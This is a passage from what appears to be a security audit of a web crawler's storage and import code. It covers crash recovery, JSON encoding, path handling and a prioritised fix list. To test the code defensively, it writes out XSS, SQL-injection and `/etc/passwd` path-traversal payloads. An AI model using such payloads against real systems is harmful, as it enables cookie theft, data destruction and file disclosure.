between them). The audit trail can have gaps but the data is correct.

**Fix recommendation:** for the importer path, consider wrapping each
record's upsert + crawl_log write in a single `with db.conn:` block.
For the live-crawl path, the existing pattern is acceptable because
the audit row is best-effort (`try/except: pass` at lines 135-136).

---

### 4.7 Check 12 — WAL mode recovery after crash (POSITIVE finding)

**Location:** `db.py:43` (`PRAGMA journal_mode = WAL`).

**Evidence (runtime):**

```
journal_mode = 'wal'
After abrupt close (no commit): wal exists=False, shm exists=False
After reopen, crawl_log count = 0  (uncommitted row correctly discarded)
After commit + reopen, crawl_log count = 1 (committed row preserved)
```

WAL mode is enabled at connection time. SQLite handles WAL recovery
automatically on the next `sqlite3.connect()` — pending WAL frames
are either replayed (if committed) or discarded (if not). The test
above confirms this: an uncommitted INSERT is lost on reopen (as
expected), and a committed INSERT is preserved.

There is **no defect** here. The crash-recovery story is sound.

---

### 4.8 Check 8 — JSON injection via parsed link labels (POSITIVE finding)

**Location:** `store.py:51` (`meta_json = json.dumps(doc.source_metadata, ensure_ascii=False)`),
`io.py:82,95,111` (export uses `ensure_ascii=False`),
`io.py:191-193` (research-note fragment dumps).

**Evidence (runtime):** a crafted `source_metadata` dict containing
`{"links": [{"url": "javascript:alert(document.cookie)",
"label": "<script>alert('XSS')</script>", "kind": "external"},
{"url": "...", "label": "'); DROP TABLE documents; --", ...}]}` was
serialised with `json.dumps(..., ensure_ascii=False)` and re-parsed
cleanly. The output is valid JSON; the `<script>` tag and the SQL
injection payload are properly quoted. No injection is possible
because JSON encoding escapes all control/quote characters.

**Positive finding:** JSON encoding is used consistently and correctly
throughout the codebase.

---

### 4.9 Check 9 — `import-jsonl` path traversal via `original_html_path` (POSITIVE finding)

**Location:** `io.py:48-49` (the only call to `upsert_document` in
the importer passes no `html_bytes`); `store.py:131-133` (the
`original_html_path` column is only set when `html_bytes` is truthy).

**Evidence (static):** `import_jsonl` calls
`_store.upsert_document(db, rec, archive_root=archive_root)` with no
`html_bytes` argument. `upsert_document` only writes
`original_html_path` when `html_bytes and archive_root is not None`
(line 131). Therefore a crafted JSONL line — even one that supplies a
malicious `original_html_path` field — cannot inject a custom path
into the column, because `DocumentIn` does not even have an
`original_html_path` field (it is set by the store layer from
`archive.store()`).

**Positive finding:** the importer cannot be used to plant arbitrary
archive paths.

---

## 5. Positive findings (security features that work)

| #  | Feature | Evidence |
|----|---------|----------|
| P-1 | Archive path traversal blocked | `archive.resolve()` correctly blocks `../`, absolute paths, and `foo/../../../etc/passwd`. `%2f`-encoded inputs are not URL-decoded by `pathlib` and stay inside the root. Symlink traversal is blocked because `Path.resolve()` follows symlinks. See §3.5. |
| P-2 | SQLite WAL recovery works | `PRAGMA journal_mode = WAL` is set; crash-recovery is automatic and was verified. See §4.7. |
| P-3 | JSON encoding is safe | `json.dumps(..., ensure_ascii=False)` is used consistently; no path for `<script>` or SQL injection through parsed labels. See §4.8. |
| P-4 | Importer cannot inject archive paths | `import-jsonl` never passes `html_bytes`, so `original_html_path` is never set from user input. See §4.9. |
| P-5 | Per-run page cap | `collector/http.py:78-83` enforces `max_pages_per_run` (default 25). The cap is checked before every fetch and cannot be bypassed without changing config. |
| P-6 | Polite delay | `collector/http.py:71-76` enforces `request_delay` (default 3.0s) between requests, with monotonic clock so system-time changes don't accelerate it. |
| P-7 | Cross-domain final-host check (partial) | Even though D-1 makes the check post-factum, the check does exist (lines 98-100), so a *successful* offsite redirect does still raise `RefusedError` and the body is not returned to the parser. The leak is "request went out", not "body returned". |
| P-8 | FTS5 query sanitisation | `textnorm.build_fts_query` strips FTS5 special characters (`" * ^ ( ) :`) before constructing the MATCH expression. No FTS5-syntax injection is possible. |
| P-9 | No user-agent spoofing | `config.py:38` declares a descriptive research UA; no browser-mimicry. |

---

## 6. Priority order for fixes

| Priority | Defect | Effort | Why first |
|----------|--------|--------|-----------|
| **P0-a** | D-1 (redirect leak) | small (one config flag + a manual redirect loop ~30 lines) | Directly leaks UA / IP / URL to any attacker who can plant a redirect on Vostlit. Smallest fix with largest impact. |
| **P0-b** | D-3 (non-2xx silent accept; 429 not retried; Retry-After ignored) | small (`raise_for_status()` + 429 special-case ~20 lines) | Silently pollutes the corpus with rate-limit / 404 / 500 bodies, replacing real document text. Combined with the live-site 3.0s delay, a single 429 wave can corrupt dozens of documents before a human notices. |
| **P0-c** | D-2 (allowed_sections bypass) | trivial (remove `'/'` from default + special-case homepage ~5 lines) | Removes the last defence-in-depth layer between the crawler and any path on Vostlit. |
| **P1-a** | D-4 (response-size cap) | medium (switch to streaming + Content-Length pre-check ~40 lines) | Memory-exhaustion DoS, especially in combination with D-1 / D-2. |
| **P1-b** | D-8 (`resp.elapsed` RuntimeError) | trivial (wrap in try/except or use `with` block ~3 lines) | Causes silent audit-log gaps in production; surfaces as "some URLs just vanish" with no error trail. |
| **P2-a** | D-7 (port-aware host check) | trivial (`parts.hostname` instead of `parts.netloc` ~2 lines) | Correctness bug; will refuse legitimate `:443` redirects after D-1 is fixed. |
| **P2-b** | D-6 (normalise_url mangles non-http schemes) | small (explicit scheme check ~5 lines) | Defence-in-depth; current behaviour is safe-by-accident. |
| **P2-c** | D-9 (FTS reindex outside write txn) | small (move `reindex_document` call inside the `with` block ~2 lines) | Consistency bug; stale FTS index after crash. |
| **P3** | D-10, D-11 (error-message hygiene, txn boundaries) | small | Audit-trail quality; not a direct security risk. |

**Single most important fix:** D-1 — switch `httpx.Client(follow_redirects=True)`
to `follow_redirects=False` and implement a manual per-hop scope check.
This single change closes the only path by which the crawler can be
made to issue a request to an attacker-controlled host, and it is a
prerequisite for the correctness of D-3 (because without it, a 302 to
a 429-returning attacker host could still bypass retries).

---

## Appendix A — Verification scripts

All scripts used to confirm defects are inline in this audit (see the
`Reproduction:` blocks). They use only `httpx.MockTransport` and the
project's own modules — no live network traffic was generated. The
sandbox blocked `os.symlink`, so the symlink-traversal argument in
§3.5 is made from `Path.resolve()` semantics and the existing passing
test `tests/test_cli_security.py:81-92`.

## Appendix B — Not in scope

- The research-engine / search modules (`search/*`, `research/api.py`)
  were not audited for security (only for the FTS5-query sanitisation
  noted in P-8). They operate on data already in the DB and do not make
  network calls.
- The CLI (`cli.py`) was not audited for argument-injection; it uses
  argparse and subprocess with list-form argv, so shell-injection is
  not a concern.
- The Skill markdown (`SKILL.md`) was not audited; it is a prompt to
  the LLM and outside the security perimeter.
